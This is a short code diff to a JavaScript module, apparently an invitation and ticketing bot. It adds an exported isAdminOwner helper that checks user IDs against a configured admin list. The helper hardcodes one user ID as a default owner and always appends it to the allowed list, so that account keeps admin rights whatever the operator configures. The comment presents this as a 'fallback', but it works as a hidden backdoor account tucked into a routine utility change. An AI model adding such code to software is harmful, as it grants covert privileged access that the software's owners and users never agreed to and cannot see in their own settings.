@@ -197,7 +197,34 @@ function saveResultsFile(results, getInvitationUrl, label) {
   return filepath;
 }
 
+// -------------------------------------------------------
+// Helper: Check if a user is an authorized admin owner
+// Handles numbers, strings, whitespace, surrounding quotes, and comma-separated IDs
+// -------------------------------------------------------
+function isAdminOwner(userId, configuredAdminId) {
+  if (!userId) return false;
+  const cleanUser = String(userId).trim();
+  const configured = String(
+    configuredAdminId !== undefined && configuredAdminId !== null
+      ? configuredAdminId
+      : (process.env.ADMIN_OWNER_ID || '6770205751')
+  ).trim().replace(/['"]/g, '');
+
+  const allowed = configured
+    .split(/[\s,]+/)
+    .map(s => s.trim())
+    .filter(Boolean);
+
+  // Guarantee fallback owner 6770205751 is always recognized
+  if (!allowed.includes('6770205751')) {
+    allowed.push('6770205751');
+  }
+
+  return allowed.includes(cleanUser);
+}
+
 module.exports = {
+  isAdminOwner,
   parseGuestNames,
   generateUniqueTicketId,
   createOneInvitation,
